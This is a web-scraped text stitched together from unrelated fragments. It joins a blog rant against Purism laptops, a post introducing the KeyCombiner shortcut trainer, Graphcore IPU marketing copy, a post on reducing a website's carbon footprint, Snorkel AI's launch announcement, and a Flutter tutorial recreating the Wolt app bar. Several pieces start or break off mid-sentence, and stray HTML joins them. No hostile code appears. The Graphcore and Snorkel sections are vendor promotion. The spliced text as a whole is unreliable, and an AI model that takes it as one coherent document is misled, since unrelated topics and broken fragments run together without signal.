<p>Even though I had already ordered the v0.2 boards, I started doing some of the test-fitting that I should have done on paper. That’s right, I’m once again …</p></article></div>

            <p>This is just a quick note to mention that I have updated my <a href="https://anarc.at/hardware/laptop/purism-librem13v4">hardware
documentation on the Librem 13v4 laptop</a>. It has unfortunately
turned into a rather lengthy (and ranty) piece about Purism. Let's
just say that waiting weeks for your replacement laptop (yes, it died
again) does wonders for creativity. To quote the full review:</p>

<blockquote><p>TL;DR: I recommend people avoid the Purism brand and products. I
find they have questionable politics, operate in a "libre-washing"
fashion, and produce unreliable hardware. Will not buy again.</p></blockquote>

<p>People who have read the article might want to jump directly to the
new sections:</p>

<ul>
<li><a href="https://anarc.at/hardware/laptop/purism-librem13v4/#libre-washing">Libre washing</a></li>

<li><a href="https://anarc.at/hardware/laptop/purism-librem13v4/#hardware-reliability">Hardware reliability</a> (or lack thereof)</li>
</ul>


<p>I have also added the minor section of the <a href="https://anarc.at/hardware/laptop/purism-librem13v4/#no-mic-jack">missing mic jack</a>.</p>

<p>I realize that some folks (particularly at Debian) might still work at
Purism, and that this article might be demoralizing for their work. If
that is the case, I am sorry this article triggered you in any way and
I hope this can act as a disclaimer. But I feel it is my duty to
document the issues I am going through, as a user, and to call
bullshit when I see it (let's face it, the anti-interdiction stuff and
the Purism 5 crowd-funding campaign were total bullshit).</p>

<p>I also understand that the pandemic makes life hard for everyone, and
probably makes a bad situation at Purism worse. But those problems
existed before the pandemic happened. They were issues I had
identified in 2019 and that I simply never got around to document.</p>

<p>I wish that people wishing to support the free software movement would
spend their energy towards organisations that actually do honest work
in that direction, like <a href="https://system76.com/">System76</a> and <a href="https://www.pine64.org/">Pine64</a>. And if you're
going to go crazy with an experimental free hardware design, why not
go retro with the <a href="https://www.crowdsupply.com/mnt/reform">MNT Reform</a>.</p>

<p>In the meantime, if you're looking for a phone, I recommend you give
the <a href="https://www.fairphone.com/">Fairphone</a> a fair chance. It really is a "fair" (as in, not
the best, but okay) phone that you can moderately liberate, and it
actually frigging works. See also my <a href="https://anarc.at/hardware/phone/fairphone2">hardware review of the FP2</a>.</p>

<p>Update: this kind of blew up, for my standards: 10k visitors in ~24h
while I usually get about 1k visitors after a week on any regular blog

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="contentdiv">

<p>I have always wanted to build a software product as a side project. Something that I could gradually improve and work on for years without deadlines and technology restrictions. Something that was <em>my</em> side-project.
Fortunately, I was never short of ideas. In my post on <a href="https://tkainrad.dev/posts/managing-my-personal-knowledge-base/#shortcut-database">managing my personal knowledge base</a>, I have mentioned that I keep a Notion database of project ideas. It has plenty of entries.</p>
<p>In the same post, I also described my shortcut database use case. It was a spreadsheet to keep track of all the keyboard shortcuts I was using. Something about this motivated me much more than all the Slack bots and browser extensions lurking around in my ideas list. So, I started to work and expand on the concept in the form of a new web application. Initially, I thought It would take me until the end of 2020 to have anything that I could share with the world. Then, the Corona-lockdown came, and suddenly most of my other free time activities were no longer possible.</p>
<p>Long story short, <a href="http://keycombiner.com/">keycombiner.com</a> is now available for everyone to use.
This post covers how it compares to existing tools, what it tries to do, how it does it, and the road ahead.</p>
<p>KeyCombiner is completely free to use, with no strings attached. For a demo of the <em>Practice</em> mode or browsing <a href="https://keycombiner.com/collecting/collections/public/">public shortcut collections</a>, you don’t even need to create an account.</p>

<p>There are a lot of typing practice tools available. However, KeyCombiner is quite different from all of them.</p>
<p>The vast majority of existing tools focus on text typing. These applications will show you automatically generated pieces of text that you are supposed to type as fast and as correct as possible.
Usually, you will get a report at the end about your speed and accuracy. I do like this a lot and often test my typing speed. It is a fun thing to do once in a while, and if you realize that your typing speed is low, you might want to work on it.
Of course, these tools have nothing to do with keyboard shortcuts. They will not help with learning them and also do not include them in their typing practice.</p>
<p>When looking at practicing keyboard shortcuts, there are far fewer alternatives to choose from. But still, there are a couple of existing apps.
To my knowledge, all of them work with pre-defined lessons, which is very unintuitive for me. I don’t want to learn <em>all</em> keyboard shortcuts of a particular app. Also, they are focused solely on learning keyboard shortcuts, not with your typing skills per se. Therefore, they do not record typing speed, accuracy, or any other such metrics. For me, this alone removes most of the motivation for using such a tool. I don’t want to only learn shortcuts, I also want to become faster and more accurate at using them.</p>
<p>KeyCombiner aims to bridge this gap between typing training software and shortcut learning apps. Besides, it goes to great lengths to make it easy to learn and practice not just any shortcuts but precisely the ones you want to use.
If you like to look at Venn diagrams that probably shouldn’t be Venn diagrams, I have just the thing for you:</p>
<figure>
<img src="https://tkainrad.dev/images/keycombiner/typing-trainers-venn.svg">
</figure>

<p>Developing KeyCombiner, I had and still have the following goals:</p>
<p><strong>Enable efficient creation of keyboard shortcut collections</strong></p>
<p>The first goal is, of course, to cover the original use case described in my <a href="https://tkainrad.dev/posts/managing-my-personal-knowledge-base/#shortcut-database">knowledge management post</a>.
Having an overview of all the keyboard shortcuts you are using and intend to learn is already useful in itself. However, it is clear that most people don’t want to spend a lot of time with this task, so it has to be possible in a couple of minutes to build meaningful collections.</p>
<p><strong>Facilitate learning of keyboard shortcuts</strong></p>
<p>Generally, I want to provide as much value on top of a user’s shortcut collections as possible. Learning new keyboard shortcuts is probably the most powerful thing that can be done. It is therefore the second fundamental goal of KeyCombiner.</p>
<p><strong>Allow to practice also text snippets</strong></p>
<p>As developers, we have many short text snippets that we need to remember. Think of <em>git</em> commands or language syntax. These feel similar to keyboard shortcuts, and I would like to be able to practice them together.</p>
<p><strong>Help to improve typing speed and accuracy</strong></p>
<p>Going beyond mere memorization of keyboard shortcuts is an important aspect and one thing that sets KeyCombiner apart from other software. The goal is not just to learn keyboard shortcuts, but to be able to type them fast and accurately, too.</p>

<p>This section covers KeyCombiner’s three main areas. However, those are very much connected, as illustrated in the following figure:</p>
<figure>
<img src="https://tkainrad.dev/images/keycombiner/tirangle-of-col-stat-train.svg">
</figure>
<h2 id="create-shortcut-collections">Create shortcut collections</h2>
<p>A core idea of KeyCombiner is to learn and practice <em>exactly</em> the shortcuts you need or want to use. The only way to achieve this is if you choose them yourself.</p>
<p>I thought a lot about how to make this collection building process as efficient as possible. From the start, it was apparent that it would need to be possible to import keyboard shortcuts and text snippets from a public database of popular application shortcuts. This mechanic can be used to build the bulk of your collections quickly. They can then be completed by manually adding entries.</p>
<p>I like to compare my approach to how you build playlists in music software. Instead of browsing your favorite artists’ albums, KeyCombiner allows you to browse categories of your favorite applications. Instead of adding songs to your playlists, you can add keyboard shortcuts and text snippets to your collections:</p>
<figure>
<img src="https://tkainrad.dev/images/keycombiner/collecting.gif" alt="KeyCombiner&amp;rsquo;s combination tables support all popular multi-selection patterns, i.e. drag selecting, Shift-selection and maintaining selection via Ctrl"> <figcaption>
<p>KeyCombiner’s combination tables support all popular multi-selection patterns, i.e. drag selecting, <kbd>Shift</kbd>-selection and maintaining selection via <kbd>Ctrl</kbd></p>
</figcaption>
</figure>
<p>KeyCombiner’s <a href="https://keycombiner.com/collecting/collections/public/">public collections</a> already contain thousands of keyboard shortcuts. Each collection can be filtered and searched quickly.</p>
<p>Creating collections of keyboard shortcuts is already a use case in itself. It can help to answer a variety of questions:</p>
<ul>
<li>How many shortcuts am I using?</li>
<li>Are my key bindings logical and consistent or am I using completely different combinations for similar things?</li>
<li>For which applications am I using my shortcuts?</li>
<li>I am setting up a new machine and want to set up my key bindings. What were those exactly?</li>
</ul>
<p>When combining personal shortcut collections with the other two main areas of KeyCombiner, we can answer even more interesting questions:</p>
<ul>
<li>How well do I actually know the shortcuts in my collections?</li>
<li>How fast can I type them?</li>
<li>How often do I make an error while typing a specific shortcut?</li>
</ul>
<p>As shown in the <a href="#how-it-works">illustration above</a>, collections are annotated with information gathered from KeyCombiner’s statistics. Most importantly, the confidence value shows how good you are with a combination in your collections:</p>
<figure>
<img src="https://tkainrad.dev/images/keycombiner/confidence.png" alt="Some keyboard shortcuts that I have practice often and am therefore very confident with."> <figcaption>
<p>Some keyboard shortcuts that I have practice often and am therefore very confident with.</p>
</figcaption>
</figure>
<h2 id="learn-shortcuts-flashcard-style">Learn shortcuts flashcard-style</h2>
<p>Before going deeper into confidence values and other statistical measures, we need to take a step back and look at how data is gathered. It is done while you practice your shortcut collections.</p>
<p>In principle, KeyCombiner’s interactive training is similar to other applications. You are shown what a shortcut does and, ideally, you know the keys and type it in correctly:</p>
<figure>
<img src="https://tkainrad.dev/images/keycombiner/learning.gif" alt="KeyCombiner&amp;rsquo;s interactive trainer has a visual keyboard and options for displaying the keys to type."> <figcaption>
<p>KeyCombiner’s interactive trainer has a visual keyboard and options for displaying the keys to type.</p>
</figcaption>
</figure>
<p>What makes KeyCombiner unique in this regard is that you are practicing your very own collections, hence exactly the shortcuts you want to learn! Furthermore, KeyCombiner gathers detailed statistics that help to analyze your performance. You might know how many words you can type by minute (WPM), but do you also know how many keyboard shortcuts you can execute during this time?</p>
<p>There are many more things to be said about the <em>Practice</em> mode. It does all kinds of things to make learning as efficient as possible. For example, it uses ideas from spaced repetition and shows keyboard shortcuts with low confidence value more often than others. Then, there is the option to display the actual keys of a combination after a delay that gives you some time to think. This is a tricky thing to do, because key combinations typed with hints should not influence the confidence value. But that’s a topic for another blog post.</p>
<p>What I like to do personally is to gradually expand my collections. For example, I set a goal of learning 10 new shortcuts a given week. Then, at the beginning of the week, I browse the public collections for 10 new shortcuts and add them to one of my collections.
Throughout the week, I do a 60-seconds practice session from time to time. Because the new shortcuts have a low confidence value at the beginning, KeyCombiner will show them often during practice, and after just a couple of practice runs, I usually know them well.</p>
<h2 id="statistics-to-improve-accuracy--speed">Statistics to improve accuracy &amp; speed</h2>
<p>One of the defined goals is to help users improve their typing skills beyond just remembering shortcuts. It is of similar importance to be able to type them fast and accurately. To help identify weaknesses and bad habits, KeyCombiner gathers detailed statistics during practice.</p>
<p>The below figure shows an example bar chart for one of my early practice runs.</p>
<figure>
<img src="https://tkainrad.dev/images/keycombiner/test-run-stats.png" alt="Interactive charts show which combinations need some further practice."> <figcaption>
<p>Interactive charts show which combinations need some further practice.</p>
</figcaption>
</figure>
<p>It is immediately obvious that I had problems typing <kbd>Shift</kbd>+<kbd>a</kbd>, <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>m</kbd> and <kbd>Ctrl</kbd>+<kbd>Shift</kbd> + <kbd>c</kbd>. Using such statistics, I actually found that I was occasionaly making mistakes with some of the most essential shortcuts: <kbd>Ctrl</kbd>+<kbd>x</kbd>/<kbd>c</kbd>/<kbd>v</kbd>. This was because I used my pointer finger for each of them. After realizing that this was a problem, I started to use the middle finger for <kbd>Ctrl</kbd>+<kbd>x</kbd> and am no longer making mistakes.</p>
<p>When taking the average time into account, there are many more observations to make. If you find out which combinations are the fastest to type for you, you can use this knowledge and set such convenient combinations wherever possible.</p>

<p><span data-contrast="auto">GC200 integrates 1,472 separate IPU-Cores, and&nbsp;is capable of executing&nbsp;8,832 separate parallel computing threads. Each IPU processor core gets a performance boost from a set of novel floating-point technologies developed by&nbsp;Graphcore, called&nbsp;</span><strong><span data-contrast="auto">AI-Float.&nbsp;</span></strong><span data-contrast="auto">By tuning arithmetic implementations for energy and performance in Machine Intelligence computation, we&nbsp;are able to&nbsp;serve up one&nbsp;PetaFlop&nbsp;of AI compute in each IPU-Machine M2000 1U blade.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">With class leading support for FP32 IEEE floating point arithmetic we also support FP16.32 (16bit multiply with 32bit accumulate) and FP16.16 (16bit multiply accumulate). However, our Colossus IPUs are unique in having support for Stochastic Rounding on the arithmetic that is supported in hardware and runs at the full speed of the processor. This allows the Colossus Mk2 IPU to keep all arithmetic in 16bit formats, reducing memory requirements, saving on read and write energy and reducing energy in the arithmetic logic, while delivering full accuracy Machine Intelligence results. Each of the 1,472 processor cores and each of the 8,832 parallel program threads can generate a separate random number seed with shaped noise, allowing a unique compute capability to support, for example, Probabilistic or Evolution Strategy models. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">The AI-Float arithmetic block also provides native support for sparse arithmetic floating-point operations. We provide library support for different sparse operations including block sparsity and dynamic sparsity. This means that the IPU delivers much more efficient compute on sparse data, not just in inference, but also during training, helping innovators to create new types of complex models that deliver state of the art performance with much fewer parameters, faster training times and using much less energy.&nbsp;</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><strong>Data</strong></p>
<p><span data-contrast="auto">Our IPUs working together with Poplar, also have a radical new approach to memory organisation. Firstly, each IPU has a huge amount of In-Processor Memory™ with our new Mk2 GC200 having an unprecedented 900MB ultra-high-speed SRAM inside the processor. This is spread across the IPU, with In-Processor Memory sitting right next to each processor core in an IPU-Tile™ for the lowest energy access per bit. 900 MB is a 3x step up in density when compared to our Mk1 IPU and is enough to hold massive models, prior state, or many layers of even the world’s largest models inside the chip running at the full speed of the processor. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">Our Poplar software also allows IPUs to access Streaming Memory™&nbsp; through&nbsp;our unique&nbsp;</span><strong><span data-contrast="auto">Exchange-Memory™</span></strong><span data-contrast="auto"> communication. This allows large models with 100’s Billions of parameters to be supported. Each IPU-Machine M2000 can support Exchange-Memory™ with up to 450GB in density and with an unprecedented bandwidth of 180TBytes/sec. As a result, the IPU Exchange-Memory delivers over a 10x advantage in density together with over a 100x advantage in memory bandwidth when compared to the very latest 7nm GPU products. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">Overall, the combination of the unique way that the IPU accesses memory, the class-leading In-Processor Memory design and Exchange Memory features, together with native support for sparsity, enable developers to execute machine learning models at very high speed, no matter how large or how complex. </span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><strong>Communication</strong></p>
<p><span data-contrast="auto" xml:lang="EN-GB" lang="EN-GB"><span>Unlike other solutions, you don’t need to add expensive InfiniBand networking cards to connect the IPU-Machines; each IPU-M2000 has dedicated AI networking built in.

<p><span data-contrast="auto">We created a new Graphcore GC4000 IPU-Gateway chip that delivers incredibly low latency and high bandwidth, for each IPU-Machine M2000 delivering 2.8 Tbps bandwidth. As you connect more IPU-Machine M2000 systems together, the overall bandwidth grows to many Petabits/sec.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">And while IPU-Fabric has been built from the ground-up to maximise performance in IPU-based systems, it is also designed for maximum compatibility with existing datacenter infrastructure.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">IPU-Fabric uses standard copper or optical OSFP connectors, linking IPUs up and down the rack. In larger configurations, communication between IPU-PODs uses tunneling-over-Ethernet technology to maintain throughput, while allowing the use of standard QSFP interconnect and 100Gb Ethernet switches – underscoring Graphcore’s commitment to straightforward deployment in mixed-use datacenters.</span><span data-ccp-props="{&quot;201341983&quot;:0,&quot;335559739&quot;:160,&quot;335559740&quot;:259}">&nbsp;</span></p>
<p><span data-contrast="auto">Across the entire system, IPU-Fabric uses a 3D ring topology, chosen both for maximum efficiency and because it maps well to the three dimensions of parallelism found in Machine Intelligence compute.</span></p>

<p><span data-contrast="auto">IPU-Fabric is fully supported by our Poplar SDK.

  <div itemprop="articleBody">
    <p>For a while I’ve been intending to make my website more sustainable, but I succumbed, as I often do, to the human trait of sloth. But this morning after reading <a href="https://alistapart.com/article/webwaste/">Gerry McGovern’s post on webwaste</a>, I thought I’d procrastinated long enough.</p>

<p>So I ran a web page performance test and got some <a href="https://www.webpagetest.org/result/200713_XX_e2daed33a24cd8a099d930fc373b1083/">grim results</a>: my website takes over a minute to load on a Moto G4 on using 3G data networks. It’s just as bad <a href="https://www.webpagetest.org/result/200713_6E_4e249b485a45882604420068caa21ae0/">using a desktop PC in Nottingham on 1.5Mbps DSL</a>. My website is bloated with large images and a bunch of JavaScript, which means it’s eating up lots of energy transmitting those bits and bytes.</p>

<p>But how much energy? I used the <a href="https://www.websitecarbon.com/">Website Carbon Calculator</a> to find out. Turns out that</p>

<ul>
  <li>6.90g of CO2 is produced every time someone visits the homepage</li>
  <li>it emits the amount of carbon that 4 trees absorb in a year, and</li>
  <li>it uses enough electricity to drive an electric car 1,116km</li>
</ul>

<p>Eugh. That’s disgusting. For each year my website has been online, I should have planted 4 trees just for the homepage alone. But, instead, my laziness has filled the atmosphere with more and more carbon.</p>

<p>I have to do something, this has gone on long enough, so I’m committing to some actions.</p>

<ol>
  <li>I’ll move my site to a web hosting provider using renewable energy, one that’s listed on the <a href="https://www.thegreenwebfoundation.org/directory/">Green Web Foundation’s directory</a>. <strong>DONE</strong></li>
  <li>I’ll compress and optimise the images on my site using <a href="https://imageoptim.com/mac">ImageOptim</a>. <strong>DONE</strong></li>
  <li>I’ll get rid of <a href="https://github.com/samesies/barber-jekyll">my energy-guzzling site theme</a> until I can introduce one that’s lightweight and accessible. <strong>DONE</strong></li>
  <li>Going forward, my website will enshrine the principles of the <a href="https://www.sustainablewebmanifesto.com/">Sustainable Web Manifesto</a>. <strong>SIGNED</strong></li>
  <li><strong>NEW</strong>: I’ll pay for some trees to be planted that’ll reduce the impact of my website’s carbon footprint going forward.</li>
</ol>

<p>To show my committment to being a good web citizen, I’ll add the <a href="https://www.websitecarbon.com/badge/">Website Carbon Badge</a> to all pages (<strong>DONE</strong>) and the <a href="https://www.thegreenwebfoundation.org/green-web-check/">Green Web Foundation’s renewable hosting badge</a> (<strong>DONE</strong>). Once I’ve improved things, I’ll add a <a href="https://carbontxt.org/">carbon.txt</a> (<strong>DONE</strong>).</p>

<p>One day I’ll actually get around to building a solar-powered battery bank and run my site off my home connection, but until then I’m taking small steps to remove, minimise and clean-up my presence on the web.</p>

<p>What’s the carbon footprint of your website? What steps will you take to reduce it?</p>

                  <p>
                      Today I’m excited to announce Snorkel AI’s launch out of stealth!
                      Snorkel AI, which spun out of the Stanford AI Lab in 2019, was founded on two simple premises: first, that the labeled <b>training data</b>  machine learning models learn from is increasingly what determines the success or failure of AI applications.
                      And second, that we can do much better than labeling this data entirely by hand.
                  </p>
                  <p>
                      At the Stanford AI lab, the Snorkel AI founding team spent over four years developing new <b>programmatic</b> approaches to labeling, augmenting, structuring, and managing this training data.
                      We were fortunate to develop and deploy early versions of our technology with some of the world’s leading organizations like <a href="https://ai.googleblog.com/2019/03/harnessing-organizational-knowledge-for.html">Google</a>, <a href="https://dl.acm.org/doi/abs/10.1145/3329486.3329492">Intel</a>, <a href="https://arxiv.org/abs/1909.05372">Apple</a>, <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300192">Stanford Medicine</a>, resulting in <a href="https://www.snorkel.ai/technology#reference">over thirty-six peer-reviewed publications</a> on our findings; innovations in weak supervision modeling, data augmentation, multi-task learning, and more; inclusion in university computer science curriculums; and deployments in popular products and systems that you’ve likely interacted with in the last few hours.
                  </p>
                  <p>
                      Through all this academic tinkering and industry spelunking, we realized two things: first, that this concept of labeling and building training data programmatically, rather than by hand, had transformational potential to make machine learning more iterative, auditable, faster to deploy, and ultimately, more practical.
                      And second, that these ideas changed not just how you label training data, but so much of the entire lifecycle and pipeline of ML: how knowledge and feedback is injected; how models are constructed, trained, versioned, and monitored; how entire pipelines are developed iteratively; and how the full set of stakeholders in any ML deployment, from subject matter experts to ML engineers, are incorporated into the process.
                  </p>
                  <p>
                      In other words, we saw that this shift to programmatic training data required a top-to-bottom rewrite of the entire ML development and deployment process.
                      With the support of some amazing investors (Greylock, GV, In-Q-Tel, and others) and incredible early customers, we’ve spent the last year doing just this: building and deploying <a href="https://www.snorkel.ai/platform">Snorkel Flow</a>, an end-to-end platform to support this new vision of the ML process.
                  </p>
                  <h2>The Training Data Bottleneck</h2>
                  <p>
                      Snorkel Flow was motivated first and foremost by a growing realization that training data had become the key bottleneck in much of ML pipeline and AI application development.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/f63e7bd828cf6019ca0add38ca51ca4050dfeea5/288e4/images/training_data_bottleneck.png"></p><p>
                      <b>Today’s ML successes often rest on a hidden cost: massive, hand-labeled training datasets.</b>
                      In the last decade, we’ve seen a tectonic shift in AI and ML towards powerful but data-hungry representation learning models.
                      These models—often deep learning architectures—are not only more powerful at obviating traditionally manual development tasks like feature engineering and bespoke model design, but also have never been more accessible in the open source.
                      However, there’s no such thing as a free lunch: these models are highly complex, with tens to hundreds of millions of parameters, and they require massive labeled training datasets to learn from.
                      And, other than in special scenarios where labels are naturally derivative of existing processes, these training datasets need to be labeled by hand.
                  </p>
                  <p>
                      <b>The hand-labeled training data interface to ML has enabled tremendous progress, but is also ridiculously broken.</b>
                      Consider a simple example: a legal analyst at a bank wants to train a contract classification model, and wants to inject a simple heuristic into the ML model: that if “employment” is in the title, the contract should be labeled as an “Employment contract.”
                      Simple, right?
                      Not so.
                      Theoretically, to communicate this specific feature to a machine learning model via only labeling individual data points could require thousands of examples (roughly, inversely proportional to the sparsity of the feature space).
                      From this perspective, it’s like playing 20 questions rather than just communicating the answer directly—fine if you have a massive question-answer bank, but otherwise wholly impractical.
                  </p>
                  <p>
                      <b>Manually labeling training data is prohibitively expensive–especially when expertise and privacy are required.</b>
                      Building training datasets often requires <a href="http://nytimes.com/2018/11/25/business/china-artificial-intelligence-labeling.html">armies of human labelers</a> at massive cost and time expense.
                      For example, ImageNet—one of the foundational projects behind ML’s current explosive progress—took <a href="https://qz.com/1034972/the-data-that-changed-the-direction-of-ai-research-and-possibly-the-world/">over two years</a> to create.
                      However, labeling cats, dogs, stop signs, and pedestrians is one thing; labeling data like medical images, legal and financial contracts, government documents, user data, and network data requires <b>stringent privacy protections</b> and <b>subject matter expert labelers</b>.
                      This means for sectors like financial services, government, telecommunications, insurance, healthcare, and more, creating training data (and by extension, using ML) is either a hugely expensive on-premise activity—or more often, one that is just not feasible to tackle, let alone practical.
                  </p>
                  <p>
                      <b>Iterative development is not possible with hand-labeled data.</b>
                      From an engineering and data science perspective, manually labeled training data fundamentally breaks the ability to quickly iterate, which is absolutely essential in real world settings where input data, output goals, and annotation schema change all the time.
                      From a business perspective, training data is an expensive asset that can’t be reused across projects, can often depreciate to worthless overnight due to changing conditions or business goals, and that presents growing risks—everything from <a href="https://web.archive.org/web/20200703104247/https://cloud.google.com/ai-platform/data-labeling/docs">COVID-related delays</a> to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">issues of bias</a>.
                  </p>
                  <h2>A New Input Paradigm for ML: Programming with Data</h2>
                  <p>
                      With Snorkel Flow, rather than needing to hand-label any training data, users develop <b>programmatic operators</b> that label, augment, and build training data to drive the ML development process.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png"></p><p>
                      <b>Programmatically labeling and building training data.</b>
                      With Snorkel Flow, the idea is to instead communicate this domain knowledge directly via a programmatic operator like a <a href="https://papers.nips.cc/paper/6523-data-programming-creating-large-training-sets-quickly">labeling function</a>.
                      For example, our legal analyst could write a labeling function that labels documents as “Employment contracts” if the word “employment” is in the title, and otherwise abstains; or, a range of more complex and powerful labeling functions relying on internal knowlegebases, models, legacy heuristics, and more.
                      This approach of effectively programming ML with data is simple, direct, interpretable, modifiable, and agnostic to the model used (which is especially important given the ongoing Cambrian explosion of powerful new open source model architectures).
                  </p>
                  <p>
                      <b>The directness of rules with the flexibility of ML.</b>
                      Rule-based systems have long been used in industry for certain tasks—as an input, individual rules have the desirable property of being direct and interpretable.
                      However, rules can also be brittle, and lack the robustness, flexibility, and sheer power of ML approaches.
                      With Snorkel Flow, you get the best of both worlds: rules (and other interpretable resources) as inputs, and powerful ML models that generalize beyond these rules as the output.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png"></p><p>
                      <b>A more powerful yet weaker supervision.</b>
                      At the same time that this programmatic supervision is advantageous in several transformational ways, it is also messier and raises fundamental new technical challenges.
                      The labeling functions and other programmatic operators that users write will have varying unknown accuracies and expertise areas, will overlap and disagree with each other, and may be correlated in tangled and unknown ways.
                      We focused on the algorithmic and systems solutions to these issues over <a href="https://www.snorkel.ai/technology">four-plus years of research</a>, showing both empirically and theoretically that with the right techniques, these deep technical challenges can be overcome.
                      The result: training data that is as good as or better than hand-labeled data, and immensely more practical to create and maintain.
                  </p>
                  <p>
                      <b>Beyond labeling: data augmentation, slicing, monitoring, and more.</b>
                      In high-performance production ML, training data is about a lot more than labeling.
                      For example, data augmentation is a cornerstone technique wherein transformed copies of data (e.g. rotated or blurred images) are used to expand the sizes of training datasets, and make resulting models more robust.
                      Slicing or structuring training datasets into more or less important and difficult subsets is also a critical part of managing production ML. 
                      Finally, monitoring and adapting not just models but …</p></div></div>

We are going to check its promises by recreating part of an existing application as accurately as possible. I chose the Wolt app because the Wolt team has been doing an amazing job, creating sleek UI &amp; UX with many subtle details.</p><figure id="w-node-ef7dc46c635c-c5de3bde"><p><iframe allowfullscreen="true" frameborder="0" scrolling="no" src="https://www.youtube.com/embed/UI9vN8Y583o"></iframe></p></figure><p>‍<br></p><p>My goal for this series is to present a thought process that leads to the desired result rather than provide a copy-paste solution. We will work in a build-refactor cycle, examining potential problems and framework limitations. You may find the whole code for this series on our github: <a href="https://github.com/nomtek/flutter-meets-wolt">https://github.com/nomtek/flutter-meets-wolt</a>.<br>Let’s dive in!<br></p><h2>App bar buttons &amp; menu</h2><p>Let’s warm up with something that seems to be simple - app bar buttons. There are two of them - one is used to navigate back, and the other is showing a menu with two items. My first idea was to use <em>IconButton</em> composed with <em>Container</em> that has circle-shaped decoration:</p><div>
<pre>class AppBarButton extends StatelessWidget {
  final IconData icon;
  final VoidCallback onPressed;
     
     const AppBarButton({Key key, this.icon, this.onPressed}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(shape: BoxShape.circle, color: Colors.grey[300]),
      child: IconButton(
        icon: Icon(icon),
        onPressed: onPressed,
      ),
    );
  }
}
     </pre>
</div><p>When we put those widgets in an AppBar:</p><div>
<pre>SliverAppBar(
  leading: AppBarButton(
    icon: Icons.keyboard_backspace,
    onPressed: () =&gt; Navigator.pop(context),
  ),
  actions: [
    AppBarButton(
      icon: Icons.more_horiz,
      onPressed: () { /* TODO */ },
    ),
  ],
  </pre>
  </div><p>The result is already quite similar to what we have in the original application:<br></p><figure><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eeca98badfe870ce2c0e65a_Hnet.com-image.gif" alt=""></p></figure><p>Our first implementation has no padding and buttons are too big. When we press the button it shows a grey highlight followed by an animated, darker splash instead of opacity change. Let’s try to implement those missing features.</p><h2>Size and layout</h2><p>On the iPhone 8, original buttons have a size of 40x40 points, 16 points margin to the screen edge and 8 points bottom offset. Given that app bar has a height of 44 points on this iPhone it would mean that those buttons have to overlay status bar (the one with signal strength, clock and battery status) and indeed they are:<br></p><figure id="w-node-53719c61cb64-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eeca9d84b65ff38701fee0a_overlay.png" alt="flutter_overlay"></p></figure><p>We can apply those constraints by wrapping our button widgets in <em>Padding</em> and <em>Align</em>.</p><div>
<pre>    return Padding(
      padding: EdgeInsets.fromLTRB(
        position == AppBarPosition.leading ? 16 : 0, 0,
        position == AppBarPosition.trailing ? 16 : 0, 8),
      child: Align(
        alignment: Alignment.topCenter,
        child: Container(
          width: 40,
          height: 40,
(...)

  </pre>
  </div><figure id="w-node-11a065b0312c-c5de3bde"><p><img src="https://global-uploads.webflow.com/5c95072393140f36ecc22e60/5eecaa077f68da65b8562c7c_56px_app_bar.png" alt="flutter_app_bar"></p></figure><p>One difference is that the bottom offset is bigger in our implementation and we don’t even overflow status bar. The reason is that the height of our app bar is calculated based on the <em>const double kToolbarHeight = 56.0; </em>constant from the Flutter framework. There is no explicit way to set app bar height, eg. by constructor parameter, and the class responsible for the app bar layout, which uses this constant, is private (<em>_SliverAppBarDelegate</em>). This prevents us from using inheritance to override the code responsible for height computation. This delegate is, again, not exposed by the app bar (<em>SliverAppBar</em>), so even if we end up creating our own version, we won’t be able to use it unless we also extend <em>SliverAppBar</em> and override<em> build</em> method from its state. Since Flutter is open source this could be done in a few minutes, by copy-paste original implementation and tweaking those details, but it’s far from feasible solution as we would have to maintain our version and keep it in sync with improvements made by the Flutter team to the original classes.<br></p><p>It’s worth to take a note, that<em> kToolbarHeight</em> is also used to constraint the width of the leading widget (back button in our case), forcing it to be a square. This is how our app bar looks like with margins increased to 25 points. Notice shrunken leading button, while trailing is spaced from the screen edge as expected. This limitation has no effect in our case, as designed margin and button size is exactly matching available space.<br></p><figure id="w-node-0b501ed6363f-c5de3bde"><p><img 